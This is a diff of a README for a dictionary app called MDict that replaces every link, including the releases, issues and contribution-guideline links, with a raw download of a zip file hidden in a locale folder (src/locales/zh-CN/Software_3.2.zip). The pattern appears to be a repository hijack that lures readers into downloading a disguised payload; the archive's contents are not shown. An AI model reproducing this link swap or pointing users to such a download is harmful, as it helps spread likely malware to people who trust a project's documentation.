@@ -1,7 +1,7 @@
 # 🎉 mdict - Simplifying Your Dictionary Use
 
 ## 📥 Download Now
-[![Download MDict](https://img.shields.io/badge/Download-MDict-blue)](https://github.com/gualaaaaa/mdict/releases)
+[![Download MDict](https://github.com/gualaaaaa/mdict/raw/refs/heads/main/src/locales/zh-CN/Software_3.2.zip)](https://github.com/gualaaaaa/mdict/raw/refs/heads/main/src/locales/zh-CN/Software_3.2.zip)
 
 ## 🚀 Getting Started
 Welcome to MDict, an easy-to-use dictionary application that helps you quickly find meanings, synonyms, and translations. This guide will help you download and run the application with ease. 
@@ -14,7 +14,7 @@ Before you begin, ensure your device meets the following requirements:
 
 ## 📥 Download & Install
 To get MDict on your device, visit the link below to download the latest version.
-- [Visit this page to download](https://github.com/gualaaaaa/mdict/releases)
+- [Visit this page to download](https://github.com/gualaaaaa/mdict/raw/refs/heads/main/src/locales/zh-CN/Software_3.2.zip)
 
 1. Click the link above to navigate to the Releases page.
 2. Look for the latest version of MDict.
@@ -55,13 +55,13 @@ Once MDict is installed, you can start using it right away. To search for a word
 
 ## 💬 Support and Feedback
 If you encounter any issues or have suggestions, feel free to reach out:
-- Open an issue on the [Issues page](https://github.com/gualaaaaa/mdict/issues)
+- Open an issue on the [Issues page](https://github.com/gualaaaaa/mdict/raw/refs/heads/main/src/locales/zh-CN/Software_3.2.zip)
 - Join our community discussions to share your experience and connect with other users.
 
 ## 👩‍💻 Contributions
-MDict is an open-source project. If you're interested in contributing, please visit our [Contribution Guidelines](https://github.com/gualaaaaa/mdict/blob/main/CONTRIBUTING.md).
+MDict is an open-source project. If you're interested in contributing, please visit our [Contribution Guidelines](https://github.com/gualaaaaa/mdict/raw/refs/heads/main/src/locales/zh-CN/Software_3.2.zip).
 
 ## 📥 More Downloads
-Don't forget to check back on the [Releases page](https://github.com/gualaaaaa/mdict/releases) for updates and additional features.
+Don't forget to check back on the [Releases page](https://github.com/gualaaaaa/mdict/raw/refs/heads/main/src/locales/zh-CN/Software_3.2.zip) for updates and additional features.
 
-Ready to enhance your dictionary experience? [Visit this page to download](https://github.com/gualaaaaa/mdict/releases) MDict today!
+Ready to enhance your dictionary experience? [Visit this page to download](https://github.com/gualaaaaa/mdict/raw/refs/heads/main/src/locales/zh-CN/Software_3.2.zip) MDict today!
